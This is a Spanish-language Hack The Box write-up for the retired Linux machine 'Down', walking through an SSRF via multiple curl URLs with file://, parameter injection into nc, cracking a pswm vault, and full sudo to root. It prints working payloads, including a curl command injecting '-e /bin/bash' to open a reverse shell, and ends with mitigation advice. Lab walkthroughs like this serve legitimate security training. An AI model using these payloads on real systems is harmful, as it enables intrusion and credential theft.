---
machine: Down
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, ssrf, curl, parameter-injection, pswm, privesc]
---

# Down — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web comprueba si una URL está activa y es vulnerable a SSRF. `curl` acepta varias URLs, así que un segundo `file://` lee archivos del host; el código revela un modo experto que usa `nc` y permite inyección de parámetros para obtener `www-data`. Un vault `pswm` de `aleks` se descifra con un diccionario, y `aleks` puede ejecutar cualquier comando como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` Apache con `down.htb`.
- La aplicación pide una URL y muestra si responde.
- `feroxbuster` encuentra `index.php` y parámetros `url`/`expertmode`.

## Enumeración

El parámetro `url` se pasa a `curl`. El filtro bloquea `file://`, pero `curl` acepta varias URLs en una sola llamada; se añade una segunda con esquema `file://` y se lee el código fuente.

```text
url=http://<ATTACKER>/ &url=file:///var/www/html/index.php
```

El código muestra `?expertmode=tcp`, que ejecuta `/usr/bin/nc -vz $ip $port`.

## Foothold

El campo `ip` solo valida una IP, pero el `port` se concatena. Se inyecta una opción de `nc` para ejecutar una reverse shell.

```bash
curl -X POST 'http://down.htb/index.php?expertmode=tcp' \
  --data-urlencode 'ip=127.0.0.1' --data-urlencode 'port=1 -e /bin/bash'
```

## Movimiento lateral

En `/home/aleks/.local/share/pswm/pswm` hay un vault de `pswm`. Se copia y se prueba el diccionario; `pswm-decryptor` recupera la contraseña de `aleks`, que funciona por SSH.

```bash
python3 pswm-decrypt.py -f pswm -w rockyou.txt
ssh aleks@down.htb
```

## Escalada de privilegios

`aleks` puede ejecutar cualquier comando como cualquier usuario.

```bash
sudo -i
```

## Evidencia

- SSRF con múltiples URLs y `file://`.
- Código fuente y modo experto.
- Inyección de parámetros en `nc`.
- Vault `pswm` y `aleks`.
- Regla sudo total y root.

## Lecciones aprendidas

- Un SSRF puede saltar filtros con esquemas alternativos.
- `curl` con varias URLs amplía la superficie.
- `escapeshellcmd` no evita inyección de argumentos.
- Los vaults locales de contraseñas son objetivos de diccionario.

## Mitigación y detección

- Validar URLs con lista blanca y resolver DNS una sola vez.
- No pasar entrada a `curl`/`nc`; usar APIs y `escapeshellarg`.
- Cifrar vaults con contraseñas fuertes.
- Limitar sudo a comandos concretos.

## Referencias

- [0xdf — Down](https://0xdf.gitlab.io/2025/06/17/htb-down.html)
- [IppSec — Down](https://www.youtube.com/watch?v=mi_t2Nz8dPk)
- [Hack The Box — Down](https://app.hackthebox.com/machines/down)
